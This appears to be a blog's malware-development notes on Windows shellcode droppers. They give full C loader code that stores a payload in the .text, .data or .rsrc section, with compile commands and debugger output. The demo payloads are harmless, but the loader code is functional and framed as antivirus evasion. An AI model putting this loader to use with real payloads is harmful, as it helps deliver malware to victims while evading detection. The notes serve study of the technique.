---
title: Notes | Dropper
author: Zeropio
date: 2023-01-28
categories: [Notes, Malware]
tags: [malware]
permalink: /notes/malware/dropper
---

**Droppers** are programs to deliver our payload to the target and execute it. This payload can be stored in:
- `.text`: needs to be insert in some function, like `main`.
- `.data`: the compiler need to know that our payload is read-only (for example a global variable).
- `.rsrc`: stored as part of the resource section.

---

# .text

We will be using the following C code. First initialize the file, variables and create a 4 byte shellcode:
```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
	
	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	
	// 4 byte payload
	unsigned char payload[] = {
		0x90,	// NOP
		0x90,	// NOP
		0xcc,	// INT3
		0xc3	// RET
	};
	unsigned int payload_len = 4;
```

**INT3** tells the CPU to suspend the process and give the control to the debugger.

> **NOP** is a **NULL** for the CPU.
{: .prompt-info}

Now we need to allocate the memory in the buffer. For some AV evasion, we need to make this buffer readable and writable, not executable:
```cpp
exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

Copy the payload to the buffer we have created:
```cpp
RtlMoveMemory(exec_mem, payload, payload_len);
```

Make the buffer executable:
```cpp
rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
```

And run the payload:
```cpp
if ( rv != 0 ) {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
}
	
return 0;
```

### Testing the payload

We can search for the pattern `90 90 CC C3` (the payload of 4 bytes we created) and we got three differents patterns:
```
Address          Data                                                                                                                                                                       
000000A53CF3FE10 90 90 CC C3
00000274AF7F0000 90 90 CC C3
00007FF66D54101E 90 90 CC C3
```

The first one match with the stack location of the function:
```
Address=000000A53CF3A000
Size=0000000000006000
Party=User
Page Information=Stack (3896)
Allocation Type=PRV
Current Protection=-RW-G
Allocation Protection=-RW--
```

The second one is the allocated memory. As we can see, the previous privileges were `-RW--` (read and write) and right now are `ER---` (execute and read), as we did in the code:
```
Address=00000274AF7F0000
Size=0000000000001000
Party=User
Allocation Type=PRV
Current Protection=ER---
Allocation Protection=-RW--
```

And the last one is the shellcode in `.text`:
```
Address=00000274AF7F0000
Size=0000000000001000
Party=User
Allocation Type=PRV
Current Protection=ER---
Allocation Protection=-RW--
```

![](assets/img/notes/malware/development/pe-text-section-shellcode.png)

So we can assume that the shellcode is inside the `.text` section.

---

# .data 

The C code for allocate it in `.data` is pretty much the same. Instead of creating a variable **payload** inside the `main` function, we created it outside as a global variable:
```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 4 byte payload
unsigned char payload[] = {
	0x90,	// NOP
	0x90,	// NOP
	0xcc,	// INT3
	0xc3	// RET
};
unsigned int payload_len = 4;

int main(void) {
```

The rest of the code will be the same.


### Testing the payload 

Search again for the payload and this time we will get two entries:
```
Address          Data                                                                                                                                                                       
000002BC972E0000 90 90 CC C3
00007FF758102000 90 90 CC C3
```

Again, we found that the first line is our payload:
```
Address=000002BC972E0000
Size=0000000000001000
Party=User
Allocation Type=PRV
Current Protection=ER---
Allocation Protection=-RW--
```

And the second one is in the `.data` section:
```
Address=00007FF758102000
Size=0000000000002000
Party=User
Page Information=".data"
Content of section=Initialized data
Allocation Type=IMG
Current Protection=-RW--
Allocation Protection=ERWC-
```

---

# .rsrc

For this, we will be using the following code. First initialize the executable:
```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
	
	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
```

Then create the payload:
```cpp
    unsigned char * payload;
	unsigned int payload_len;
	
	//Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (char *) LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
```

And now use the same as before to generate the executable buffer:
```cpp
	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	
	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}
	
	return 0;
}
```

As we can see, thepayload is now stored in a file called `FAVICON_ICO`. This file comes from a **resources** files. For this, we will have:
- **resources.h**
```cpp
#define FAVICON_ICO 100
```

- **resources.rc**
```cpp
#include "resources.h"

FAVICON_ICO RCDATA calc.ico
```

Where **calc.ico** is a meterpreter generated file to start **calc.exe**.

And the compilation will be different. Convert the resources files into a resource file (`.res`), then convert the resource file into an object file (`.o`) and finally compile with the object file:
```console
C:\Users\Zeropio> rc resources.rc
C:\Users\Zeropio> cvtres /MACHINE:x64 /OUT:resources.o resources.res
C:\Users\Zeropio> cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc<FILE>.cpp /link /OUT:<NAME>.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 resources.o
```

### Testing the payload

We can find our payload inside the `.rsrc`:
```
Address=00007FF6CF527000
Size=0000000000001000
Party=User
Page Information=".rsrc"
Content of section=Resources
Allocation Type=IMG
Current Protection=-RWC-
Allocation Protection=ERWC-
```

And the buffer:
```
Address=000001D536130000
Size=0000000000001000
Party=User
Allocation Type=PRV
Current Protection=ER---
Allocation Protection=-RW--
```






